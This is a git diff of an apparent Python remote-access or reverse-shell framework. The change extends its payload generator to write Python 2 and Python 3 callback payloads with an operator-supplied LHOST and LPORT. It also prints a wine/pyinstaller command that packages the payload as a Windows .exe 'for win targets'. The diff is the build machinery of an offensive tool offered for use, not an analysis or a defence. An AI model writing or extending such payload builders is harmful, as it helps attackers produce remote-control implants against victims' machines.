@@ -4,12 +4,13 @@ import json
 import sys
 import os
 import signal
+import pathlib
 import colorama
+import subprocess as sp
 from colorama import Fore, Style
 
 
 conn_list={}
-
 
 
 
@@ -92,11 +93,19 @@ def generatePayload():
         os.remove("generated/payload.py")
     else:
         pass
+    
+    if os.path.exists("generated/payload2.py"):
+        os.remove("generated/payload2.py")
+    else:
+        pass
+
+
     # Read from listener.py , and replace both port and host to those introduced by user, then append to payload.py
     print(Fore.YELLOW,"[!] Defaults to 127.0.0.1 - 443",Style.RESET_ALL)
     lhost=input("LHOST> ") or "127.0.0.1"
     lport=input("LPORT> ") or "443"
     # Read payload file, and replace host variable
+    # Generate python3 payload
     f = open("utils/listener.py", "r")
     x = open("generated/payload.py", "w+")
     for line in f:
@@ -110,23 +119,47 @@ def generatePayload():
             else:
                 x.write(line)
     f.close()
-    print(Fore.YELLOW,"[*] Creating .exe payload for win targets . . .", Style.RESET_ALL)
-    # We need to compile using wine bruuuuhhhhh, :()
-    # $ sudo apt-get install wine
-    # $ wget https://www.python.org/ftp/python/2.7.9/python-2.7.9.amd64.msi
-    # $ wine msiexec /i python-2.7.9.amd64.msi /qb
-    # $ sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
-    # $ cd ~/.wine/drive_c/Python27
-    # $ wine python.exe Scripts/pip.exe install pyinstaller
-    # $ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile helloworld.py
-    
-    
-    print(Fore.YELLOW,"[*] .exe created! Check dist folder!  . . .",Style.RESET_ALL)
 
+    # Generate python2 payload
+    f = open("utils/listener2.py", "r")
+    x = open("generated/payload2.py", "w+")
+    for line in f:
+        if ( "HOST = 127.0.0.1" in line ):
+            x.write("    HOST = '" + lhost + "'\n")
+        if ( "443" in line):
+            x.write("    PORT = " + lport + "\n")
+        else:
+            if ( "HOST = 127.0.0.1" in line ):
+                pass
+            else:
+                x.write(line)
+    f.close()
+
+
+    # Check if wine is installed
+    check_tool("wine")
+
+
+    print(Fore.YELLOW,"[*] Create .exe payload for win targets . . .", Style.RESET_ALL)
+    path=pathlib.Path().absolute()
+    print("cd ",path," && ","wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile generated/payload2.py")
+
+def check_tool(tool):
+    # Check if wine is installed
+    try:
+        null = open("/dev/null", "w")
+        sp.Popen(tool, stdout=null, stderr=null)
+        print(Fore.GREEN,"[!] " + tool + " found!")
+        null.close()
+
+    except OSError:
+        print(Fore.RED,"[!] " + tool + " not found! Aborting . . .")
+        sys.exit(1)
 
 
 def bye():
     print(Fore.YELLOW," \n[!] ooof bye :(",Style.RESET_ALL)
+    sys.exit(1)
 
 
 def banner():
